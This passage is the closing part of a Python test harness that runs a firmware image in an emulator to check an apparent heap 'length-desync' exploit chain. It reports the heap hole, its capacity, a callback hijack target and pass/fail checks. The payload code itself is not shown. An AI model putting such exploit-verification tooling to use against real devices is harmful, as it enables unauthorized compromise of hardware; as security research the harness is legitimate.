    args = ap.parse_args(argv)

    if not os.path.isfile(args.image):
        ap.error(f"image not found: {args.image}")
    if args.runs < 1:
        ap.error("--runs must be >= 1")

    sha = hashlib.sha256(open(args.image, "rb").read()).hexdigest()
    print("== DA1 200EX01 length-desync chain ==")
    print(f"image : {args.image}")
    print(f"sha256: {sha[:32]}...")
    print(f"mode  : direct DRAM-REPAIR handler (committed probe path), "
          f"{args.runs} fresh-emulator runs/config")
    print(f"heap  : 0x{HEAP_BASE:06x}..0x{HEAP_END:06x} (compile-time); "
          f"hole=0x{HOLE:x} (load_str malloc(0x40)); "
          f"capacity=0x{HOLE_CAP:x}; cb target=0x{CB_TARGET:08x}")

    cfgs = build_configs(quick=args.quick)
    results = [run_config(args.image, c, args.runs) for c in cfgs]

    layout_ls = ((0x10, 0x30, 0x3C, 0x40, 0x100)
                 if not args.quick else (0x10, 0x3C, 0x40))
    layout = [probe_layout(args.image, L) for L in layout_ls]
    preludes = [] if args.no_preludes else probe_preludes(args.image)

    print_layout(layout)
    if preludes:
        good = [p for p in preludes if "error" not in p]
        print(f"\n== prelude cross-check (committed da1_geometry_study) ==")
        print(f"{'L':>7} {'prelude':24s} {'D':>10} {'chunk':>9} "
              f"{'tree_chunks_above_D':>19}")
        for p in good:
            print(f"0x{p['L']:05x} {p['prelude']:24s} {_hex(p['D']):>10} "
                  f"{_hex(p['chunk']):>9} {p['tree_chunks_above_D']:>19}")
    print_det_table(results)
    checks = evaluate(results, layout, preludes)
    status = print_verdict(checks)

    if args.json:
        payload = {
            "image": args.image, "sha256": sha, "runs": args.runs,
            "heap": {"base": HEAP_BASE, "end": HEAP_END, "hole": HOLE,
                     "capacity": HOLE_CAP, "cb_target": CB_TARGET},
            "results": results, "layout": layout, "preludes": preludes,
            "checks": [{"name": n, "pass": ok, "detail": d}
                       for ok, n, d in checks],
            "status": status,
        }
        with open(args.json, "w") as f:
            json.dump(payload, f, indent=1, sort_keys=True)
        print(f"\njson written: {args.json}")

    return 0 if status == "PASS" else 1


if __name__ == "__main__":
    sys.exit(main())
